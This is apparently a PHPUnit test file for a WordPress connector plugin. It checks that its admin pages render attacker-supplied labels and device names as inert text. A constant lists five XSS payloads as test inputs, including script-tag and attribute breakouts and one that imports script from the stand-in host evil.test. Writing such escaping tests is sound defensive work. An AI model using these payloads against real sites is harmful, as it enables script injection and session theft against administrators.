<?php
/**
 * Hostile labels and device names (they come from other people) must stay text on every admin
 * page: no event handler attributes, no inline scripts, no attribute breakouts.
 *
 * @package Runova\Connector
 */

namespace Runova\Connector\Tests\Unit;

use Runova\Connector\Admin\AdminViews;
use Runova\Connector\Support\Text;
use Runova\Connector\Tests\Support\TestCase;

require_once dirname(__DIR__) . '/Support/wp-stubs.php';

final class AdminViewsTest extends TestCase
{
    const HOSTILE = array(
        "&quot;+import('//evil.test/x.js')+&quot;",
        '"><script>alert(1)</script>',
        "'); alert(1); ('",
        '&#34; onmouseover=&#34;alert(1)',
        '<img src=x onerror=alert(1)>',
    );

    private function render(callable $view): string
    {
        ob_start();
        $view();
        return (string) ob_get_clean();
    }

    /**
     * @return array<int, array<string, mixed>>
     */
    private function connections(): array
    {
        $rows = array();
        foreach (self::HOSTILE as $index => $text) {
            $rows[] = array(
                'id' => '00000000-0000-4000-8000-00000000000' . $index,
                'label' => $text,
                'scope' => 'write',
                'device_name' => $text,
                'created_at' => 1790000000,
                'expires_at' => null,
                'revoked_at' => null,
                'last_seen_at' => 1790000100,
                'last_ip' => '203.0.113.9',
            );
        }
        return $rows;
    }

    /**
     * @return array<int, array<string, mixed>>
     */
    private function deploys(): array
    {
        $rows = array();
        foreach (self::HOSTILE as $index => $text) {
            $rows[] = array(
                'deployId' => '00000000-0000-4000-8000-00000000000' . $index,
                'state' => 'done',
                'label' => $text,
                'startedAt' => 1790000000,
                'finishedAt' => 1790000100,
                'connectionLabel' => $text,
                'puts' => 1,
                'deletes' => 0,
                'canRollback' => true,
            );
        }
        return $rows;
    }

    /** Parses the HTML and fails on any handler attribute, script element or javascript: URL. */
    private function assertInert(string $html): \DOMDocument
    {
        $this->assertStringNotContainsString('<script', $html);
        // In every tag, with its quoted values taken out, no on*= attribute is left.
        preg_match_all('/<[a-z][^>]*>/i', $html, $tags);
        foreach ($tags[0] as $tag) {
            $this->assertDoesNotMatchRegularExpression('/\son[a-z]+\s*=/i', (string) preg_replace('/"[^"]*"/', '""', $tag), $tag);
        }
        $dom = new \DOMDocument();
        $previous = libxml_use_internal_errors(true);
        $dom->loadHTML('<!DOCTYPE html><html><head><meta charset="utf-8"></head><body>' . $html . '</body></html>');
        libxml_use_internal_errors($previous);
        foreach ((new \DOMXPath($dom))->query('//*') as $element) {
            $this->assertNotSame('script', strtolower($element->nodeName));
            foreach ($element->attributes as $attribute) {
                $this->assertStringStartsNotWith('on', strtolower($attribute->name), 'No event handler after parsing either.');
                $this->assertStringStartsNotWith('javascript:', strtolower(trim($attribute->value)));
            }
        }
        return $dom;
    }

    public function testConnectionsTabKeepsHostileNamesAsText(): void
    {
        $html = $this->render(function () {
            AdminViews::connections($this->connections(), 1790000200);
        });
        $dom = $this->assertInert($html);
        $forms = (new \DOMXPath($dom))->query('//form[@data-runova-confirm]');
        $this->assertSame(count(self::HOSTILE), $forms->length);
        foreach ($forms as $index => $form) {
            // The question is plain data that still names the connection.
            $question = $form->getAttribute('data-runova-confirm');
            $this->assertStringStartsWith('Revoke "', $question);
            $this->assertSame(1, $form->getElementsByTagName('button')->length);
        }
    }

    public function testDeploysTabKeepsHostileLabelsAsText(): void
    {
        $html = $this->render(function () {
            AdminViews::deploys($this->deploys(), null, true);
        });
        $dom = $this->assertInert($html);
        $this->assertSame(count(self::HOSTILE), (new \DOMXPath($dom))->query('//form[@data-runova-confirm]')->length);
    }

    public function testAuditAndKeysTabsAreInert(): void
    {
        $entries = array();
        foreach (self::HOSTILE as $index => $text) {
            $entries[] = array('id' => $index + 1, 'at' => 1790000000, 'event' => 'paired', 'connectionLabel' => $text, 'ip' => '203.0.113.9', 'detail' => 'Paired "' . $text . '"');
        }
        $this->assertInert($this->render(function () use ($entries) {
            AdminViews::audit($entries, null, null);
        }));
        $this->assertInert($this->render(function () {
            AdminViews::keys(array('key' => 'amwp1.abc', 'expiresAt' => 1790000900, 'scope' => 'write'), '"><script>alert(1)</script>', true);
        }));
    }

    public function testThePageScriptIsAFixedString(): void
    {
        $this->assertStringContainsString("getAttribute('data-runova-confirm')", AdminViews::SCRIPT);
        $this->assertStringNotContainsString('innerHTML', AdminViews::SCRIPT);
        $this->assertStringNotContainsString('<?php', AdminViews::SCRIPT);
    }

    public function testNamesAreMadeSafeToShowWhenStored(): void
    {
        $this->assertSame('Laptop', Text::displaySafe("  Lap\u{202E}top\u{200B}  "));
        $this->assertSame('a b', Text::displaySafe("a\u{009B}\n\t b"));
        $this->assertSame(64, Text::codePoints(Text::displaySafe(str_repeat('é', 80), 64)));
        $this->assertSame("Amin's \"Mac\" & co", Text::displaySafe("Amin's \"Mac\" & co"), 'Ordinary punctuation stays; escaping is the views\' job.');
    }
}
